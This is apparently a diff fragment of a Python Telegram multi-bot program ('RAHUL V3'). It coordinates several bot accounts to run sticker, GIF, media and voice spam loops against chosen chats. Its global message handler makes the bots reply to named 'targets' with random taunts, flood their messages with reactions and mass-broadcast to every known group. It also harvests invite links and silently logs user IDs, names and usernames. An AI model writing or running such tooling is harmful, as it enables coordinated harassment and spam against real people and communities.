+        await safe_reply(message, font(f"🔊 Target {acc_link} unmuted."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("mutelist", prefix="-./X!"))
+
+
+
+@dp.message(Command("mutelist", prefix="-./X!"))
+
+
+
+async def cmd_mutelist(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not muted_users: return await safe_reply(message, font("📭 No muted targets."))
+
+
+
+    
+
+
+
+    mute_list = []
+
+
+
+    for u in muted_users:
+
+
+
+        name = user_names.get(u, "Muted Target")
+
+
+
+        mute_list.append(f"•[{name}](tg://user?id={u}) (`{u}`)" if u > 0 else f"• Channel (`{u}`)")
+
+
+
+        
+
+
+
+    await safe_reply(message, font("🔇 Muted Targets:\n\n") + "\n".join(mute_list), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+async def set_admin(bot, chat_id, uid, promote_all=True):
+
+
+
+    return await bot.promote_chat_member(
+
+
+
+        chat_id=chat_id, user_id=uid, is_anonymous=False,
+
+
+
+        can_change_info=promote_all, can_delete_messages=promote_all,
+
+
+
+        can_invite_users=promote_all, can_restrict_members=promote_all,
+
+
+
+        can_pin_messages=promote_all, can_promote_members=promote_all,
+
+
+
+        can_manage_chat=promote_all, can_manage_video_chats=promote_all
+
+
+
+    )
+
+
+
+
+
+
+
+@dp.channel_post(Command("promote", prefix="-./X!"))
+
+
+
+@dp.message(Command("promote", prefix="-./X!"))
+
+
+
+async def cmd_promote(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    uid, _ = await get_target_info(message, command.args)
+
+
+
+    if uid:
+
+
+
+        try:
+
+
+
+            await set_admin(bot, message.chat.id, uid, True)
+
+
+
+            await safe_reply(message, font("✅ Promoted successfully."))
+
+
+
+        except Exception as e:
+
+
+
+            await safe_reply(message, font(f"❌ Error: {e}"))
+
+
+
+
+
+
+
+@dp.channel_post(Command("demote", prefix="-./X!"))
+
+
+
+@dp.message(Command("demote", prefix="-./X!"))
+
+
+
+async def cmd_demote(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    uid, _ = await get_target_info(message, command.args)
+
+
+
+    if uid:
+
+
+
+        try:
+
+
+
+            await set_admin(bot, message.chat.id, uid, False)
+
+
+
+            await safe_reply(message, font("🛑 Demoted."))
+
+
+
+        except Exception: pass
+
+
+
+
+
+
+
+@dp.channel_post(Command("promoteallbots", "gpromoteallbots", prefix="-./X!"))
+
+
+
+@dp.message(Command("promoteallbots", "gpromoteallbots", prefix="-./X!"))
+
+
+
+async def cmd_promoteallbots(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    s = 0
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        for b in bots:
+
+
+
+            try:
+
+
+
+                await set_admin(b, c_id, b.id, True)
+
+
+
+                s += 1
+
+
+
+            except Exception: pass
+
+
+
+            
+
+
+
+    scope_str = f"across {len(target_chats)} Lord list groups" if is_lord else "in this chat"
+
+
+
+    await safe_reply(message, font(f"🤖 Promoted bots ({s} actions) {scope_str}."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("promoteall", prefix="-./X!"))
+
+
+
+@dp.message(Command("promoteall", prefix="-./X!"))
+
+
+
+async def cmd_promoteall(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    s = 0
+
+
+
+    for uid in list(known_users):
+
+
+
+        try:
+
+
+
+            await set_admin(bot, message.chat.id, uid, True)
+
+
+
+            s += 1
+
+
+
+        except Exception: pass
+
+
+
+    await safe_reply(message, font(f"✅ Promoted {s} users."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("getlink", prefix="-./X!"))
+
+
+
+@dp.message(Command("getlink", prefix="-./X!"))
+
+
+
+async def cmd_getlink(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    try:
+
+
+
+        cid = int(command.args.strip())
+
+
+
+        invite = await bot.export_chat_invite_link(cid)
+
+
+
+        await safe_reply(message, font(f"🩷🫧 Invite link:\n{invite}"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    except Exception: pass
+
+
+
+
+
+
+
+@dp.channel_post(Command("getallactivelinks", prefix="-./X!"))
+
+
+
+@dp.message(Command("getallactivelinks", prefix="-./X!"))
+
+
+
+async def cmd_getallactivelinks(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not known_chats: return await safe_reply(message, font("⚠️ No known chats yet."))
+
+
+
+    links = []
+
+
+
+    for cid in list(known_chats):
+
+
+
+        if cid > 0: continue
+
+
+
+        try:
+
+
+
+            invite = await bot.export_chat_invite_link(cid)
+
+
+
+            links.append(f"• **{cid}**: {invite}")
+
+
+
+        except Exception: pass
+
+
+
+    txt = "\n".join(links) if links else font("❌ Could not generate any links.")
+
+
+
+    await safe_reply(message, font("🔗 **Active Group Links:**\n\n") + txt, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
+
+
+
+
+
+
+
+@dp.channel_post(Command("broadcast", prefix="-./X!"))
+
+
+
+@dp.message(Command("broadcast", prefix="-./X!"))
+
+
+
+async def cmd_broadcast(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if message.reply_to_message:
+
+
+
+        target = message.reply_to_message
+
+
+
+        is_copy = True
+
+
+
+    else:
+
+
+
+        if not command.args:
+
+
+
+            return await safe_reply(message, font("⚠️ Usage: !broadcast <text> or reply to photo/sticker/media"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        target_text = command.args.strip()
+
+
+
+        is_copy = False
+
+
+
+
+
+
+
+    count = 0
+
+
+
+    groups = [cid for cid in known_chats if cid < 0]
+
+
+
+    
+
+
+
+    for cid in groups:
+
+
+
+        for b in bots:
+
+
+
+            try:
+
+
+
+                if is_copy:
+
+
+
+                    await b.copy_message(chat_id=cid, from_chat_id=target.chat.id, message_id=target.message_id)
+
+
+
+                else:
+
+
+
+                    await b.send_message(cid, target_text)
+
+
+
+                count += 1
+
+
+
+                break
+
+
+
+            except Exception:
+
+
+
+                pass
+
+
+
+                
+
+
+
+    await safe_reply(message, font(f"📣 **BROADCAST COMPLETE**\n✅ Sent successfully to {count}/{len(groups)} known groups/channels!"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.callback_query(F.data.startswith("stk_"))
+
+
+
+async def sticker_callback_handler(query: types.CallbackQuery, bot: Bot):
+
+
+
+    if query.from_user.id not in SUDO_USERS:
+
+
+
+        return await query.answer(font("❌ You are not SUDO/Owner."), show_alert=True)
+
+
+
+        
+
+
+
+    data = query.data.split("_")
+
+
+
+    task_id = data[1]
+
+
+
+    menu = active_menus.get(task_id)
+
+
+
+    if not menu or menu.get("cmd") != "makesticker":
+
+
+
+        return await query.answer("Menu expired.", show_alert=True)
+
+
+
+        
+
+
+
+    action_type = data[2]
+
+
+
+    
+
+
+
+    if action_type == "gen":
+
+
+
+        await query.answer("🎨 Generating Sticker...")
+
+
+
+        sticker_bytes = create_sticker_image(menu["text"], bg_color=menu["color"], font_type=menu["font"])
+
+
+
+        if sticker_bytes:
+
+
+
+            await bot.send_sticker(query.message.chat.id, BufferedInputFile(sticker_bytes, filename="sticker.webp"))
+
+
+
+            del active_menus[task_id]
+
+
+
+        else:
+
+
+
+            await query.answer("Error generating sticker.", show_alert=True)
+
+
+
+    else:
+
+
+
+        if len(data) > 3:
+
+
+
+            action_val = data[3]
+
+
+
+            if action_type == "c":
+
+
+
+                menu["color"] = action_val
+
+
+
+                await query.answer() 
+
+
+
+            elif action_type == "f":
+
+
+
+                menu["font"] = action_val
+
+
+
+                await query.answer()
+
+
+
+
+
+
+
+@dp.callback_query(F.data.startswith("tts_"))
+
+
+
+async def tts_callback_handler(query: types.CallbackQuery, bot: Bot):
+
+
+
+    if query.from_user.id not in SUDO_USERS:
+
+
+
+        return await query.answer(font("❌ You are not SUDO/Owner."), show_alert=True)
+
+
+
+        
+
+
+
+    data = query.data.split("_")
+
+
+
+    task_id = data[1]
+
+
+
+    lang = data[2]
+
+
+
+    
+
+
+
+    menu = active_menus.get(task_id)
+
+
+
+    if not menu or menu.get("cmd") != "tts":
+
+
+
+        return await query.answer("Menu expired.", show_alert=True)
+
+
+
+        
+
+
+
+    await query.answer("🎙 Generating Audio...")
+
+
+
+    audio_bytes = await generate_tts(menu["text"], lang=lang)
+
+
+
+    if audio_bytes:
+
+
+
+        await bot.send_voice(query.message.chat.id, BufferedInputFile(audio_bytes, filename=f"tts_{lang}.ogg"))
+
+
+
+        del active_menus[task_id]
+
+
+
+    else:
+
+
+
+        await query.answer("Failed to generate audio.", show_alert=True)
+
+
+
+
+
+
+
+@dp.callback_query(F.data.startswith("tk_"))
+
+
+
+async def callback_query_handler(query: types.CallbackQuery, bot: Bot):
+
+
+
+    if query.from_user.id not in SUDO_USERS:
+
+
+
+        return await query.answer(font("❌ You are not SUDO/Owner."), show_alert=True)
+
+
+
+    
+
+
+
+    data = query.data.split("_")
+
+
+
+    task_id = data[1]
+
+
+
+    action = data[2]
+
+
+
+    menu = active_menus.get(task_id)
+
+
+
+    if not menu:
+
+
+
+        return await query.answer(font("❌ Menu expired or task already running."), show_alert=True)
+
+
+
+    
+
+
+
+    try:
+
+
+
+        if action == "tgl":
+
+
+
+            idx = int(data[3])
+
+
+
+            if idx in menu['selected']: menu['selected'].remove(idx)
+
+
+
+            else: menu['selected'].add(idx)
+
+
+
+            await query.answer() 
+
+
+
+            await bot.edit_message_reply_markup(chat_id=query.message.chat.id, message_id=query.message.message_id, reply_markup=get_selector_keyboard(task_id))
+
+
+
+        elif action == "all":
+
+
+
+            menu['selected'] = set(range(len(bots)))
+
+
+
+            await query.answer()
+
+
+
+            await bot.edit_message_reply_markup(chat_id=query.message.chat.id, message_id=query.message.message_id, reply_markup=get_selector_keyboard(task_id))
+
+
+
+        elif action == "none":
+
+
+
+            menu['selected'].clear()
+
+
+
+            await query.answer()
+
+
+
+            await bot.edit_message_reply_markup(chat_id=query.message.chat.id, message_id=query.message.message_id, reply_markup=get_selector_keyboard(task_id))
+
+
+
+        elif action == "start":
+
+
+
+            if not menu['selected']:
+
+
+
+                return await query.answer(font("⚠️ Select at least one bot!"), show_alert=True)
+
+
+
+            await query.answer(font("🚀 Firing tasks!"))
+
+
+
+            await bot.edit_message_text(font(f"✅ Started **{menu['cmd'].upper()}** with {len(menu['selected'])} bots!"), chat_id=query.message.chat.id, message_id=query.message.message_id, parse_mode=ParseMode.MARKDOWN)
+
+
+
+            for idx in menu['selected']:
+
+
+
+                if idx >= len(bots): continue
+
+
+
+                bt = bots[idx]
+
+
+
+                run_id = str(uuid.uuid4())
+
+
+
+                c_id = menu['chat_id']
+
+
+
+                
+
+
+
+                cmd_type = menu['cmd']
+
+
+
+                if cmd_type == "pfp":
+
+
+
+                    if c_id not in pfp_tasks: pfp_tasks[c_id] = []
+
+
+
+                    pfp_tasks[c_id].append(run_id)
+
+
+
+                    asyncio.create_task(pfp_loop_worker(bt, c_id, run_id))
+
+
+
+                elif cmd_type in ["stickerspm", "gifspm", "mediaspm", "voicespm"]:
+
+
+
+                    if cmd_type == "stickerspm": target_dict = sticker_spm_tasks
+
+
+
+                    elif cmd_type == "gifspm": target_dict = gif_spm_tasks
+
+
+
+                    elif cmd_type == "mediaspm": target_dict = media_spm_tasks
+
+
+
+                    elif cmd_type == "voicespm": target_dict = voice_spm_tasks
+
+
+
+                    
+
+
+
+                    if c_id not in target_dict: target_dict[c_id] = []
+
+
+
+                    target_dict[c_id].append(run_id)
+
+
+
+                    
+
+
+
+                    if cmd_type in ["mediaspm", "voicespm"]:
+
+
+
+                        asyncio.create_task(media_spm_sender(bt, c_id, menu['media_type'], menu['file_id'], menu.get('caption'), menu.get('caption_entities'), target_dict, run_id))
+
+
+
+                    else:
+
+
+
+                        asyncio.create_task(copy_spm_sender(bt, c_id, menu['from_chat_id'], menu['msg_id'], target_dict, run_id))
+
+
+
+            del active_menus[task_id]
+
+
+
+    except TelegramBadRequest as e:
+
+
+
+        if "message is not modified" in str(e).lower():
+
+
+
+            pass
+
+
+
+
+
+
+
+@dp.channel_post()
+
+
+
+@dp.message()
+
+
+
+async def global_message_handler(message: types.Message, bot: Bot):
+
+
+
+    chat_id = message.chat.id
+
+
+
+    
+
+
+
+    uid = None
+
+
+
+    if message.from_user:
+
+
+
+        uid = message.from_user.id
+
+
+
+        known_users.add(uid)
+
+
+
+        user_names[uid] = message.from_user.first_name
+
+
+
+        if message.from_user.username:
+
+
+
+            username_to_id[message.from_user.username.lower()] = uid
+
+
+
+            
+
+
+
+    sender_chat_id = message.sender_chat.id if message.sender_chat else None
+
+
+
+    
+
+
+
+    known_chats.add(chat_id)
+
+
+
+
+
+
+
+    if not is_processed(message.message_id, chat_id):
+
+
+
+        
+
+
+
+        possible_targets = [t for t in [chat_id, sender_chat_id, uid] if t is not None]
+
+
+
+        
+
+
+
+        target_for_react = next((t for t in possible_targets if t in react_targets), None)
+
+
+
+        if target_for_react:
+
+
+
+            emoji_to_react = react_targets[target_for_react]
+
+
+
+            for b in bots:
+
+
+
+                async def delayed_react(b_instance, delay):
+
+
+
+                    await asyncio.sleep(delay)
+
+
+
+                    try:
+
+
+
+                        await b_instance.set_message_reaction(
+
+
+
+                            chat_id=chat_id,
+
+
+
+                            message_id=message.message_id,
+
+
+
+                            reaction=[ReactionTypeEmoji(type='emoji', emoji=emoji_to_react)]
+
+
+
+                        )
+
+
+
+                    except Exception: pass
+
+
+
+                
+
+
+
+                asyncio.create_task(delayed_react(b, random.uniform(0.1, 2.0)))
+
+
+
+
+
+
+
+        target_for_reply = next((t for t in possible_targets if t in reply_RAHUL_targets), None)
+
+
+
+        if target_for_reply and REPLY_RAHUL_TEXTS:
+
+
+
+            for b in bots:
+
+
+
+                async def delayed_reply(b_instance, delay):
+
+
+
+                    await asyncio.sleep(delay)
+
+
+
+                    try:
+
+
+
+                        await b_instance.send_message(
+
+
+
+                            chat_id=chat_id,
+
+
+
+                            text=random.choice(REPLY_RAHUL_TEXTS),
+
+
+
+                            reply_to_message_id=message.message_id
+
+
+
+                        )
+
+
+
+                    except Exception: pass
+
+
+
+                asyncio.create_task(delayed_reply(b, random.uniform(0.1, 1.5)))
+
+
+
+
+
+
+
+        target_for_slide = next((t for t in possible_targets if t in targetslide_targets), None)
+
+
+
+        if target_for_slide and TARGET_SLIDE_TEXTS:
+
+
+
+            target_name = targetslide_targets[target_for_slide]
+
+
+
+            mention = f"[{target_name}](tg://user?id={target_for_slide})" if target_for_slide > 0 else target_name
+
+
+
+            for b in bots:
+
+
+
+                text = random.choice(TARGET_SLIDE_TEXTS).replace("{name}", mention)
+
+
+
+                async def delayed_slide(b_instance, delay, txt):
+
+
+
+                    await asyncio.sleep(delay)
+
+
+
+                    try:
+
+
+
+                        await b_instance.send_message(
+
+
+
+                            chat_id=chat_id,
+
+
+
+                            text=txt,
+
+
+
+                            reply_to_message_id=message.message_id,
+
+
+
+                            parse_mode=ParseMode.MARKDOWN
+
+
+
+                        )
+
+
+
+                    except Exception: pass
+
+
+
+                asyncio.create_task(delayed_slide(b, random.uniform(0.1, 1.5), text))
+
+
+
+
+
+
+
+        if chat_id in swipe_mode:
+
+
+
+            name_arg = swipe_mode[chat_id]
+
+
+
+            for b in bots:
+
+
+
+                template = random.choice(SWIPE_TEXTS)
+
+
+
+                async def delayed_swipe(b_instance, delay, txt):
+
+
+
+                    await asyncio.sleep(delay)
+
+
+
+                    try:
+
+
+
+                        await b_instance.send_message(
+
+
+
+                            chat_id=chat_id,
+
+
+
+                            text=txt,
+
+
+
+                            reply_to_message_id=message.message_id,
+
+
+
+                            parse_mode=ParseMode.MARKDOWN
+
+
+
+                        )
+
+
+
+                    except Exception: pass
+
+
+
+                asyncio.create_task(delayed_swipe(b, random.uniform(0.1, 1.5), template.replace("NAME", name_arg)))
+
+
+
+
+
+
+
+async def main():
+
+
+
+    print(f"\n{GREEN}⏳ INITIALIZING...{RESET}\n")
+
+
+
+    for token in TOKENS:
+
+
+
+        if token.strip():
+
+
+
+            bot_instance = Bot(token=token.strip())
+
+
+
+            bots.append(bot_instance)
+
+
+
+    for b in bots:
+
+
+
+        try:
+
+
+
+            me = await b.get_me()
+
+
+
+            bot_usernames.append(me.username)
+
+
+
+            print(f"{GREEN}✅ CONNECTED SUCCESSFULLY: @{me.username}{RESET}")
+
+
+
+        except Exception as e:
+
+
+
+            print(f"{RED}❌ Error starting a bot: {e}{RESET}")
+
+
+
+    print(f"\n{GREEN}RAHUL V3 STARTED!{RESET}\n")
+
+
+
+    
+
+
+
+    await dp.start_polling(*bots, drop_pending_updates=True)
+
+
+
+
+
+
+
+if __name__ == "__main__":
+
+
+
+    try:
+
+
+
+        asyncio.run(main())
+
+
+
+    except (KeyboardInterrupt, SystemExit):
+
+
+
+        save_db()
+
+
+
+        print(f"\n{RED}🛑 SHUTTING DOWN RAHUL...{RESET}")
